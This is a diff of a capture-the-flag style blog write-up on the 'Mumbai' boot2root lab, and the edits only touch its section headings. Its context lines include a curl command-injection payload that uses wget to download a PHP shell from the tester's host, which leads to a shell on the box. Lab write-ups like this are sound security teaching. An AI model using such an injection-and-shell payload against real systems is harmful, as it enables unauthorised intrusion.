@@ -9,10 +9,10 @@ tags:
   - InfoSec
 ---
 
-##Background
+## Background
 Mumbai SEO is a fun and interesting boot2root challenge created by AbsoZed. There are many such challenges on the internet, but this one was refreshing in the sense that it isn't strictly a CTF-style box. The avenue for exploitation may be relatively easy compared to more robust applications these days; however, it's easy for me to imagine there are a lot of similar issues out there waiting to be discovered that are similar in nature to this box. This was a fun challenge for me to take on as I have had very minimal exposure to docker and containerization in general prior to doing this. Let's jump in.
 
-##Information Gathering
+## Information Gathering
 Most interesting in the port scan below in terms of risk is what appears to be a default FTP credential enabled. We can ascertain this information by simply running nmap with default scripts enabled and to toggle service version enumeration.
 
 ```bash
@@ -38,7 +38,7 @@ Looking at the note we see an intersting quip from the admin concerning the use 
 
 Additionally, there is a small mention of privilege escalation scripts needing to be cleaned up in /tmp. That is definitely interesting, and we'll make a note to follow-up on it later.
 
-##Service Enumeration
+## Service Enumeration
 Nothing is really jumping out at me so far with low-hanging fruit, so we'll need to dive deeper on the services we already know about. There are two HTTP services available: apache2, and nginx. Running gobuster on both of these might reveal some more info.
 
 ![](/assets/images/mumbai_apache2.png)
@@ -78,6 +78,8 @@ This is a good sign that something is probably terribly wrong here, so let's loo
 ![](/assets/images/mumbai_nginx2.png)
 
 Now we're onto something. With the added extensions, we discovered a test.php file, and a keywords.py file. Let's first examine what happens on test.php. It's always good to check suspicious php applications as there may be debugging comments or other annotations that describe what the script does. 
+
+## Exploitation
 
 ![](/assets/images/mumbai_testphp.png)
 
@@ -139,6 +141,8 @@ curl -d "query=http://10.10.10.13/wordpress; wget http://10.10.10.12/shell.php; 
 ```
 
 ![](/assets/images/mumbai_apiuser.png)
+
+## Privilege Escalation
 
 Excellent! Now we have shell on the box. One thing I always like to try is stabilize the shell in case I need to do something important like interacting with a service. There are a number of different ways this can be done, but in this case I'll do the following:
 
